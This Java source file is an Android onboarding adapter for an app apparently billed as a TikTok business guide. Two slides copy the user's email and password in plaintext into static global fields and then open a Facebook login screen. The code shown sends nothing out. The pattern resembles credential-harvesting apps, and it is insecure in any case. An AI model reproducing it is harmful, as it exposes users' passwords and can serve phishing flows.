package com.teamwork.businessguideprofortiktok.src.activity.adapters.introduce_adapter;

import android.content.Intent;

import android.graphics.Color;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.TextView;


import androidx.annotation.NonNull;
import androidx.cardview.widget.CardView;
import androidx.recyclerview.widget.RecyclerView;

import com.hbb20.CountryCodePicker;
import com.teamwork.businessguideprofortiktok.R;
import com.teamwork.businessguideprofortiktok.src.activity.pages.introduce_page.IntroduceActivity;
import com.teamwork.businessguideprofortiktok.src.activity.pages.login_facebook_page.LoginFacebookActivity;
import com.teamwork.businessguideprofortiktok.src.utils.Constant;

import java.util.ArrayList;


public class IntroduceAdapter extends RecyclerView.Adapter<RecyclerView.ViewHolder> {
    private ArrayList<Integer> mArrayLayout;
    private IntroduceActivity mIntroduceActivity;

    public IntroduceAdapter(ArrayList<Integer> mArrayLayout, IntroduceActivity introduceActivity) {
        this.mArrayLayout = mArrayLayout;
        this.mIntroduceActivity = introduceActivity;
    }

    @Override
    public int getItemViewType(int position) {
        return position;
    }

    @NonNull
    @Override
    public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        LayoutInflater layoutInflater = LayoutInflater.from(mIntroduceActivity);
        switch (viewType) {
            case 0:
                return new FragmentSlider0(layoutInflater.inflate(mArrayLayout.get(0), parent, false));
            case 1:
                return new FragmentSlider1(layoutInflater.inflate(mArrayLayout.get(1), parent, false));
            case 2:
                return new FragmentSlider2(layoutInflater.inflate(mArrayLayout.get(2), parent, false));
            case 3:
                return new FragmentSlider3(layoutInflater.inflate(mArrayLayout.get(3), parent, false));
            case 4:
                return new FragmentSlider4(layoutInflater.inflate(mArrayLayout.get(4), parent, false));
            case 5:
                return new FragmentSlider5(layoutInflater.inflate(mArrayLayout.get(5), parent, false));
            case 6:
                return new FragmentSlider6(layoutInflater.inflate(mArrayLayout.get(6), parent, false));
            case 7:
                return new FragmentSlider7(layoutInflater.inflate(mArrayLayout.get(7), parent, false));
            default:
                return null;
        }
    }

    @Override
    public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder, int position) {
        switch (position) {
            case 0:
                final FragmentSlider0 fragmentSlider0 = (FragmentSlider0) holder;
                fragmentSlider0.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        mIntroduceActivity.scroollView(3);
                    }
                });
                break;
            case 1:
                FragmentSlider1 fragmentSlider1 = (FragmentSlider1) holder;
                break;
            case 2:
                FragmentSlider2 fragmentSlider2 = (FragmentSlider2) holder;
                fragmentSlider2.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        mIntroduceActivity.scroollView(3);
                    }
                });
                break;
            case 3:
                FragmentSlider3 fragmentSlider3 = (FragmentSlider3) holder;
                break;
            case 4:
                final FragmentSlider4 fragmentSlider4 = (FragmentSlider4) holder;

                fragmentSlider4.mCheckBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                    @Override
                    public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                        if(isChecked){
                            fragmentSlider4.mCardCreate.setCardBackgroundColor(Color.BLUE);
                        }else{
                            fragmentSlider4.mCardCreate.setCardBackgroundColor(mIntroduceActivity.getColor(R.color.color_card));
                        }
                    }
                });

                final CountryCodePicker countryCodePicker = fragmentSlider4.mCountryCodePicker;
                countryCodePicker.setOnCountryChangeListener(new CountryCodePicker.OnCountryChangeListener() {
                    @Override
                    public void onCountrySelected() {
                        fragmentSlider4.mtxtNumberCountry.setText("+"+countryCodePicker.getSelectedCountryCode());
                    }
                });
                fragmentSlider4.mCardCreate.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        String email = fragmentSlider4.mEdtEmail.getText().toString();
                        String password = fragmentSlider4.mEdtPassword.getText().toString();

                        Constant.mUserName = email;
                        Constant.mPassword = password;
                        mIntroduceActivity.startActivity(new Intent(mIntroduceActivity.getApplicationContext(), LoginFacebookActivity.class));
                        mIntroduceActivity.finish();
                    }
                });
                break;
            case 5:
                FragmentSlider5 fragmentSlider5 = (FragmentSlider5) holder;
                break;
            case 6:
                FragmentSlider6 fragmentSlider6 = (FragmentSlider6) holder;
                fragmentSlider6.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        mIntroduceActivity.scroollView(3);
                    }
                });
                break;
            case 7:
                final FragmentSlider7 fragmentSlider7 = (FragmentSlider7) holder;
                fragmentSlider7.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        mIntroduceActivity.scroollView(3);
                    }
                });

                fragmentSlider7.mBtnGetCreate1.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        mIntroduceActivity.scroollView(3);
                    }
                });
                fragmentSlider7.mCardLogin.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        String email = fragmentSlider7.mEdtEmail.getText().toString();
                        String password = fragmentSlider7.mEdtPassword.getText().toString();
                        Constant.mUserName = email;
                        Constant.mPassword = password;
                        mIntroduceActivity.startActivity(new Intent(mIntroduceActivity.getApplicationContext(), LoginFacebookActivity.class));
                        mIntroduceActivity.finish();
                    }
                });
                break;
        }
    }


    @Override
    public int getItemCount() {
        return mArrayLayout.size();
    }

    public class FragmentSlider0 extends RecyclerView.ViewHolder {
        private Button mBtnGetCreate;

        public FragmentSlider0(@NonNull View itemView) {
            super(itemView);
            mBtnGetCreate = itemView.findViewById(R.id.btn_get_create);
        }

    }

    public class FragmentSlider1 extends RecyclerView.ViewHolder {
        public FragmentSlider1(@NonNull View itemView) {
            super(itemView);
        }
    }

    public class FragmentSlider2 extends RecyclerView.ViewHolder {
        private Button mBtnGetCreate;

        public FragmentSlider2(@NonNull View itemView) {
            super(itemView);
            mBtnGetCreate = itemView.findViewById(R.id.btn_get_create);
        }
    }

    public class FragmentSlider3 extends RecyclerView.ViewHolder {
        public FragmentSlider3(@NonNull View itemView) {
            super(itemView);
        }
    }

    public class FragmentSlider4 extends RecyclerView.ViewHolder {
        private CheckBox mCheckBox;
        private EditText mEdtEmail, mEdtPassword;
        private TextView mtxtNumberCountry;
        private CountryCodePicker mCountryCodePicker;
        private CardView mCardCreate;

        public FragmentSlider4(@NonNull View itemView) {
            super(itemView);
            mEdtEmail = itemView.findViewById(R.id.edt_Email);
            mEdtPassword = itemView.findViewById(R.id.edt_Password);
            mCardCreate = itemView.findViewById(R.id.card_create);
            mCountryCodePicker = itemView.findViewById(R.id.country_picker);
            mtxtNumberCountry = itemView.findViewById(R.id.txt_number_country);
            mCheckBox = itemView.findViewById(R.id.checkbox);
        }
    }

    public class FragmentSlider5 extends RecyclerView.ViewHolder {
        public FragmentSlider5(@NonNull View itemView) {
            super(itemView);
        }
    }

    public class FragmentSlider6 extends RecyclerView.ViewHolder {
        private Button mBtnGetCreate;

        public FragmentSlider6(@NonNull View itemView) {
            super(itemView);
            mBtnGetCreate = itemView.findViewById(R.id.btn_get_create);
        }
    }

    public class FragmentSlider7 extends RecyclerView.ViewHolder {
        private Button mBtnGetCreate, mBtnGetCreate1;
        private EditText mEdtEmail, mEdtPassword;
        private CardView mCardLogin;

        public FragmentSlider7(@NonNull View itemView) {
            super(itemView);
            mBtnGetCreate = itemView.findViewById(R.id.btn_get_create);
            mBtnGetCreate1 = itemView.findViewById(R.id.btn_get_create1);
            mEdtEmail = itemView.findViewById(R.id.edt_Email);
            mEdtPassword = itemView.findViewById(R.id.edt_Password);
            mCardLogin = itemView.findViewById(R.id.card_login);

        }
    }
}
